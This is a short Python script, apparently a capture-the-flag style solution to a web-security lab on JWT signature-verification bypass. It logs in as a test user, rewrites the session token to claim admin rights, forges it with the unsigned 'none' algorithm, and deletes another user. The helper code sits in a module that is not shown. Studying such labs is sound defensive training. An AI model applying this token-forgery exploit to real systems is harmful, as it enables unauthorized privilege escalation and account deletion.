import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, get_session_token, lab_session, make_none_token, set_session


lab = lab_session("JWT authentication bypass via flawed signature verification")
lab.login("wiener", "peter")

_, payload = become_admin_payload(get_session_token(lab))
forged = make_none_token(payload)

set_session(lab, forged)
delete_carlos(lab)

